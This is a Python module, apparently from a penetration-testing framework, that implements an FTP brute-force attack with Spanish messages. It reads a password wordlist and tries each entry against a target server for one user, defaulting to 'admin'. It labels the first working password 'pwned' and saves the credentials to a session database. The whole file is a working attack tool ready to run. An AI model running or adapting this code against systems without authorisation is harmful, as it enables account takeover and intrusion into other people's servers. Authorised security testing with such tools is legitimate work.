# scripts/ftp/attack/brute_force.py
import ftplib
import time
from scripts.base import BaseScript
from core.output import print_result, print_check, console
from core import session_db

class Script(BaseScript):
    name        = "brute-force"
    protocol    = "ftp"
    category    = "attack"
    description = "Fuerza bruta FTP contra un usuario concreto usando wordlist de contraseñas."

    def run(self, **kwargs):
        port     = int(kwargs.get("port") or 21)
        timeout  = int(kwargs.get("timeout") or self.target.timeout or 5)
        user     = kwargs.get("user") or self.creds.user or "admin"
        passlist = kwargs.get("passlist")
        delay    = float(kwargs.get("delay") or 0.5)
        ip       = self.target.ip

        if not passlist:
            console.print("[red]Necesitas passlist para brute-force[/red]")
            return None

        try:
            with open(passlist) as f:
                passwords = [l.strip() for l in f if l.strip()]
        except OSError as e:
            console.print(f"[red]No se pudo leer passlist: {e}[/red]")
            return None

        print_result("FTP", ip, "info",
                     f"brute-force: {len(passwords)} contraseñas para '{user}'")

        for pwd in passwords:
            try:
                ftp = ftplib.FTP()
                ftp.connect(ip, port, timeout)
                ftp.login(user, pwd)
                ftp.quit()
                print_result("FTP", ip, "pwned", f"CONTRASEÑA ENCONTRADA: {user}:{pwd}")
                session_db.save_credential(ip, user, pwd, "ftp_password",
                                           valid=True, source="ftp_bruteforce")
                session_db.save_finding(ip, "FTP", "brute_force_success", f"{user}:{pwd}")
                return {"user": user, "password": pwd}
            except ftplib.error_perm:
                pass
            except Exception:
                pass
            if delay:
                time.sleep(delay)

        print_check(f"Brute force: sin contraseña válida para '{user}'", ok=True)
        return None
